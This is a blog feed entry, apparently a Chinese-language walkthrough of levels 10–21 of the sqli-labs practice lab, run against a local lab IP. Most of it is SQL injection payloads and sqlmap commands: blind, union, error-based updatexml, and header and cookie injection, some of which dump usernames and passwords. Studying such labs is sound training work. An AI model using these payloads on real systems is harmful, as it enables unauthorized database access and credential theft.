<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql-labs通关笔记(下)</title>
      <link href="/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/"/>
      <url>/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/</url>
      
        <content type="html"><![CDATA[<h1 id="sql-labs通关笔记-下"><a href="#sql-labs通关笔记-下" class="headerlink" title="sql-labs通关笔记(下)"></a>sql-labs通关笔记(下)</h1><p><img src="Untitled.png" alt="Untitled"></p><p>上次漏了第十关，这次补上，另外几乎所有用到的知识点都在上篇了，找到数据库名之后的操作就不再赘述，在上篇都有讲</p><p>上篇地址：<a href="https://jo4hua.github.io/2024/07/01/sql-labs通关笔记(上">sql-labs通关笔记（上）</a>/)</p><h2 id="Less-10：GET-Blind-Time-based-double-quotes"><a href="#Less-10：GET-Blind-Time-based-double-quotes" class="headerlink" title="Less-10：GET -Blind -Time based -double quotes"></a>Less-10：GET -Blind -Time based -double quotes</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%201.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%202.png" alt="Untitled"></p><p>可以基本判断和上一题一样依旧是时间盲注</p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用各种符号加上 and sleep(3)—+来判断闭合方式，需要保持and前的条件为真</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and sleep(3)--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：判断闭合方式为双引号</strong></p><p><img src="Untitled%203.png" alt="Untitled"></p><h3 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot; and if(ascii(substring((select database()),1,1))&gt;10,sleep(3),0)--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：判断出数据库的第一个字符为s，睡眠三秒，后面将使用sqlmap进行演示</strong></p><p><img src="Untitled%204.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-10/?id=1&quot;</span> --threads 10 --level 2 --batch</span><br></pre></td></tr></table></figure><ul><li>—level 指需要执行的测试等级，一共有5个等级（1~5级），可不加“level”，默认是1级,5级尝试的payload最多，但是也最慢，这里只需要使用二级即可</li><li>—batch 从不询问用户输入，默认yes</li></ul><p><strong>结果：判断为时间盲注</strong></p><p><img src="Untitled%205.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-10/?id=1&quot;</span> --threads 10 --level 2 --batch --current-db </span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名security，后面我们就不再演示，第十关结束</strong></p><p><img src="Untitled%206.png" alt="Untitled"></p><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><h2 id="Less-11：POST-Error-Based-single-quotes-string"><a href="#Less-11：POST-Error-Based-single-quotes-string" class="headerlink" title="Less-11：POST -Error Based -single quotes- string"></a>Less-11：POST -Error Based -single quotes- string</h2><h3 id="界面-1"><a href="#界面-1" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%207.png" alt="Untitled"></p><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>像是这种post类型的，可以现在每一个输入框内进行尝试，先在username中使用单引号进行尝试</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：登陆成功，说明闭合方式为单引号，并且有回显，我们就可以尝试联合查询注入</strong></p><p><img src="Untitled%208.png" alt="Untitled"></p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 3 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：不是三列</strong></p><p><img src="Untitled%209.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：字段数为2列</strong></p><p><img src="Untitled%2010.png" alt="Untitled"></p><h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="Untitled%2011.png" alt="Untitled"></p><h3 id="爆破数据库名-1"><a href="#爆破数据库名-1" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,database() #</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名称security</strong></p><p><img src="Untitled%2012.png" alt="Untitled"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure><p><strong>结果：表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2013.png" alt="Untitled"></p><h3 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure><p><strong>结果：users表的字段名id,username,password</strong></p><p><img src="Untitled%2014.png" alt="Untitled"></p><h3 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,group_concat(username,0x7e,password) from users #</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据</strong></p><p><img src="Untitled%2015.png" alt="Untitled"></p><h2 id="Less-12：POST-Error-Based-Double-quotes-String-with-twist"><a href="#Less-12：POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Less-12：POST-Error Based-Double quotes-String -with twist"></a>Less-12：POST-Error Based-Double quotes-String -with twist</h2><h3 id="界面-2"><a href="#界面-2" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2016.png" alt="Untitled"></p><h3 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>因为有回显，所以直接用\判断注入点以及闭合方式</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure><p><strong>报错信息：去掉用来引出报错信息的单引号，发现闭合方式是双引号+括号</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;\&quot;) and password=(&quot;&quot;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><h3 id="判断字段数-1"><a href="#判断字段数-1" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;order by 2 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：字段数为2</strong></p><p><img src="Untitled%2018.png" alt="Untitled"></p><h3 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) union select 1,2 #</span></span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="Untitled%2019.png" alt="Untitled"></p><h3 id="爆破数据库名-2"><a href="#爆破数据库名-2" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) union select 1,database() #</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名为security，后面就不在赘述，第十二关结束</strong></p><p><img src="Untitled%2020.png" alt="Untitled"></p><h2 id="Less-13：PosT-Double-Injection-Single-quotes-string-with-twist"><a href="#Less-13：PosT-Double-Injection-Single-quotes-string-with-twist" class="headerlink" title="Less-13：PosT -Double Injection -Single quotes- string - with twist"></a>Less-13：PosT -Double Injection -Single quotes- string - with twist</h2><h3 id="界面-3"><a href="#界面-3" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2021.png" alt="Untitled"></p><h3 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure><p><strong>报错信息：单引号加括号闭合</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;) and password=(&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p><img src="Untitled%2022.png" alt="Untitled"></p><p><strong>payload：使用万能密码登录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) or 1=1#</span></span><br></pre></td></tr></table></figure><p><strong>结果：无回显，但是一开始我们知道有报错信息，可以使用报错注入</strong></p><p><img src="Untitled%2023.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure><p><strong>结果：爆破出数据库名，后面不再演示，第十三关结束</strong></p><p><img src="Untitled%2024.png" alt="Untitled"></p><h2 id="Less-14：PosT-Double-Injection-single-quotes-string-with-twist"><a href="#Less-14：PosT-Double-Injection-single-quotes-string-with-twist" class="headerlink" title="Less-14：PosT -Double Injection -single quotes- string -with twist"></a>Less-14：PosT -Double Injection -single quotes- string -with twist</h2><h3 id="界面-4"><a href="#界面-4" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2025.png" alt="Untitled"></p><h3 id="判断注入点-4"><a href="#判断注入点-4" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>直接\</p><p><strong>报错信息：使用双引号闭合</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;\&quot; and password=&quot;&quot; LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><h3 id="爆破数据库名-3"><a href="#爆破数据库名-3" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; and updatexml(1,concat(0x7e,database()),1) #</span></span><br></pre></td></tr></table></figure><p><strong>结果：security，后面不再演示，第十四关结束</strong></p><p><img src="Untitled%2026.png" alt="Untitled"></p><h2 id="Less-15：PosT-Blind-Boolian-time-Based-Single-quotes"><a href="#Less-15：PosT-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less-15：PosT -Blind-Boolian/time Based -Single quotes"></a>Less-15：PosT -Blind-Boolian/time Based -Single quotes</h2><h3 id="界面-5"><a href="#界面-5" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2027.png" alt="Untitled"></p><h3 id="判断注入点-5"><a href="#判断注入点-5" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload：无回显，使用各种符号结合orr1=1进行判断注入点</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; or 1=1# </span></span><br></pre></td></tr></table></figure><p><strong>结果：判断闭合方式为单引号</strong></p><p><img src="Untitled%2028.png" alt="Untitled"></p><h3 id="爆破数据库"><a href="#爆破数据库" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p><strong>payload：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or substring(database(),1,1)=&#x27;</span>s<span class="string">&#x27;# </span></span><br><span class="line"><span class="string">1&#x27;</span> or database()=<span class="string">&#x27;security&#x27;</span><span class="comment"># </span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库为security，后面可以使用sqlmap，不再演示，第十五关结束</strong></p><p><img src="Untitled%2029.png" alt="Untitled"></p><h2 id="Less-16：PosT-Blind-Boolian-Time-Based-Double-quotes"><a href="#Less-16：PosT-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="Less-16：PosT -Blind-Boolian/Time Based -Double quotes"></a>Less-16：PosT -Blind-Boolian/Time Based -Double quotes</h2><h3 id="界面-6"><a href="#界面-6" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2030.png" alt="Untitled"></p><h3 id="判断注入点-6"><a href="#判断注入点-6" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) or 1=1#</span></span><br></pre></td></tr></table></figure><p><strong>结果：判断出闭合方式为双引号+括号</strong></p><p><img src="Untitled%2031.png" alt="Untitled"></p><h3 id="爆破数据库名-4"><a href="#爆破数据库名-4" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&quot;) or substring(database(),1,1)=&#x27;s&#x27;#</span></span><br><span class="line"><span class="string">1&quot;</span>) or database()=<span class="string">&#x27;security&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名</strong></p><p><img src="Untitled%2032.png" alt="Untitled"></p><h3 id="使用sqlmap进行POST注入"><a href="#使用sqlmap进行POST注入" class="headerlink" title="使用sqlmap进行POST注入"></a>使用sqlmap进行POST注入</h3><p>这里需要结合我们的burp进行抓包</p><p><strong>结果：将最后一行的post传递的参数复制下来</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=1%22%29+or+database%28%29%3D%27security%27%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="Untitled%2033.png" alt="Untitled"></p><p>现在使用我们的sqlmap</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-16/&quot;</span> --data=<span class="string">&quot;uname=1&amp;passwd=&amp;submit=Submit&quot;</span> --threads 10 --level 3 </span><br></pre></td></tr></table></figure><ul><li>— data 表示post传递的数据 后面跟我们刚刚在burp中复制的东西</li></ul><p><strong>结果：发现存在盲注</strong></p><p><img src="Untitled%2034.png" alt="Untitled"></p><h3 id="使用sqlmap爆破数据库名"><a href="#使用sqlmap爆破数据库名" class="headerlink" title="使用sqlmap爆破数据库名"></a>使用sqlmap爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.199.128/sqli/Less-16/&quot;</span> --data=<span class="string">&quot;uname=1&amp;passwd=&amp;submit=Submit&quot;</span> --threads <span class="number">10</span> --level <span class="number">3</span> --current-db</span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名，后面不多赘述，第十六关结束</strong></p><p><img src="Untitled%2035.png" alt="Untitled"></p><h2 id="Less-17：PosT-Update-Query-Error-Based-string"><a href="#Less-17：PosT-Update-Query-Error-Based-string" class="headerlink" title="Less-17：PosT -Update Query- Error Based -string"></a>Less-17：PosT -Update Query- Error Based -string</h2><h3 id="界面-7"><a href="#界面-7" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2036.png" alt="Untitled"></p><h3 id="判断注入点-7"><a href="#判断注入点-7" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以看到上面有一个大大的黄字，说是密码重置，那么一般遇到密码重置的页面，我们一般都是通过给出正确的用户名来进行修改，先对username判断有没有注入点</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">各种符号或存在的用户名+符号</span><br></pre></td></tr></table></figure><p><strong>结果：发现有做防护，只有在username完全是存在的用户名时才不会报错</strong></p><p><img src="Untitled%2037.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumb</span><br></pre></td></tr></table></figure><p><strong>结果：username无注入点，接下来测试password</strong></p><p><img src="Untitled%2038.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:dumb</span><br><span class="line">new password:<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>结果：无回显，但是存在报错，可以使用报错注入</strong></p><p><img src="Untitled%2039.png" alt="Untitled"></p><h3 id="爆破数据库-1"><a href="#爆破数据库-1" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:dumb</span><br><span class="line">new password:<span class="string">&#x27;and updatexml(1,concat(0x7e,database()),1) #</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名称，后面步骤重复，不再演示，第十七关结束</strong></p><p><img src="Untitled%2040.png" alt="Untitled"></p><h2 id="Less-18：POST-Header-injection-Uagent-field-Error-based"><a href="#Less-18：POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="Less-18：POST -Header injection -Uagent field - Error based"></a>Less-18：POST -Header injection -Uagent field - Error based</h2><p><img src="Untitled%2041.png" alt="Untitled"></p><h3 id="判断注入点-8"><a href="#判断注入点-8" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在username和password中各种测试</span><br></pre></td></tr></table></figure><p><strong>结果：除了正常登陆外，没有发现别的异常</strong></p><p><img src="Untitled%2042.png" alt="Untitled"></p><p><strong>payload</strong></p><p>我们选择一个正常的账户进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p><strong>结果：有回显，内容其实是请求头中的内容user-agent，抓包</strong></p><p><img src="Untitled%2043.png" alt="Untitled"></p><p><strong>抓包放到重放器中</strong></p><p><img src="Untitled%2044.png" alt="Untitled"></p><p>在重放器中找到我们的user-agent来判断是否存在注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>结果：报错，可以使用报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;Gecko/20100101Firefox/127 0&#x27;</span>,<span class="string">&#x27;127.0 0 1&#x27;</span>,<span class="string">&#x27;admin  at line 1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2045.png" alt="Untitled"></p><h3 id="爆破数据库名-5"><a href="#爆破数据库名-5" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1),1) #</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>因为根据报错信息可知，闭合方式为单引号和括号，但是因为这句并不是查询语句。所以并不能直接闭合然后在用and报错注入，先把单引号闭合然后 报错注入后再闭合括号</p><p><strong>结果：得到数据库名，后续操作不再演示，第十八关结束</strong></p><p><img src="Untitled%2046.png" alt="Untitled"></p><h2 id="Less-19：POST-HeaderIniection-Referer-field-Error-based"><a href="#Less-19：POST-HeaderIniection-Referer-field-Error-based" class="headerlink" title="Less-19：POST-HeaderIniection-Referer field -Error based"></a>Less-19：POST-HeaderIniection-Referer field -Error based</h2><h3 id="界面-8"><a href="#界面-8" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2047.png" alt="Untitled"></p><h3 id="判断注入点-9"><a href="#判断注入点-9" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先使用admin，admin或一个确定的账户登录，查看回显</span><br></pre></td></tr></table></figure><p><strong>结果：回显refer，用老办法尝试username和password处并不存在注入点，因此抓包判断refer</strong></p><p><img src="Untitled%2048.png" alt="Untitled"></p><p><strong>抓包：依旧放到重放器中</strong></p><p><img src="Untitled%2049.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>结果：报错，发现闭合方式为单引号和括号，可以使用报错注入</strong></p><p><img src="Untitled%2050.png" alt="Untitled"></p><h3 id="爆破数据库名-6"><a href="#爆破数据库名-6" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;) or updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure><p><strong>结果：直接闭合单引号括号，报错猜测是插入语句</strong></p><p><img src="Untitled%2051.png" alt="Untitled"></p><p><strong>payload：验证一下是不是插入语句</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) #</span></span><br></pre></td></tr></table></figure><p><strong>结果：经典的插入语句报错</strong></p><p><img src="Untitled%2052.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,database()),1))#</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名，后面不再演示，第十九关结束</strong></p><p><img src="Untitled%2053.png" alt="Untitled"></p><h2 id="Less-20：POST-Cookie-injections-Uagent-field-error-based"><a href="#Less-20：POST-Cookie-injections-Uagent-field-error-based" class="headerlink" title="Less-20：POST-Cookie injections -Uagent field -error based."></a>Less-20：POST-Cookie injections -Uagent field -error based.</h2><h3 id="界面-9"><a href="#界面-9" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2054.png" alt="Untitled"></p><h3 id="判断注入点-10"><a href="#判断注入点-10" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>依旧在username和password中找不到注入点</p><p>使用正确的账户进行登录admin，admin</p><p><img src="Untitled%2055.png" alt="Untitled"></p><p><strong>抓包并上传到重放器，抓登陆后的</strong></p><p><img src="Untitled%2056.png" alt="Untitled"></p><p>在username处进行尝试看看是否存在注入点</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=<span class="string">&#x27; ;</span></span><br></pre></td></tr></table></figure><p><strong>结果：根据报错信息可知其使用单引号闭合</strong></p><p><img src="Untitled%2057.png" alt="Untitled"></p><h3 id="爆破数据库名-7"><a href="#爆破数据库名-7" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=<span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名，后面不再赘述，第二十关结束</strong></p><p><img src="Untitled%2058.png" alt="Untitled"></p><h2 id="Less-21：POST-Dump-into-outfile-string"><a href="#Less-21：POST-Dump-into-outfile-string" class="headerlink" title="Less-21：POST- Dump into outfile -string ."></a>Less-21：POST- Dump into outfile -string .</h2><h3 id="界面-10"><a href="#界面-10" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2059.png" alt="Untitled"></p><h3 id="判断注入点-11"><a href="#判断注入点-11" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用正常用户登录admin，admin</p><p><img src="Untitled%2060.png" alt="Untitled"></p><p><strong>刷新，抓包，并发送到重放器</strong></p><p><img src="Untitled%2061.png" alt="Untitled"></p><p>发现Cookie中的uname使用的是BASE64加密很可疑，我们可以使用burp自带的解密进行查看，<strong>注意：其中%3D为URL编码，意思是=，防止base64解密出错，可以先URLdecode</strong></p><p><img src="Untitled%2062.png" alt="Untitled"></p><p>同时也可以利用自带的base64-encode进行加密，我们使用单引号然后base64加密进行构造payload看看是否存在注入点</p><p><strong>payload：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=Jw==;</span><br></pre></td></tr></table></figure><p><strong>结果：根据报错信息可知，闭合方式为单引号+括号（为什么三个单引号，因为我们前面没填东西，就把前面的一个单引号给爆出来了）</strong></p><p><img src="Untitled%2063.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpLDEpIw== ;</span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名称，后面不再赘述，第二十一关结束</strong></p><p><img src="Untitled%2064.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SYN Flood攻击</title>
      <link href="/2024/07/01/SYN%20Flood%E6%94%BB%E5%87%BB/"/>
      <url>/2024/07/01/SYN%20Flood%E6%94%BB%E5%87%BB/</url>
      
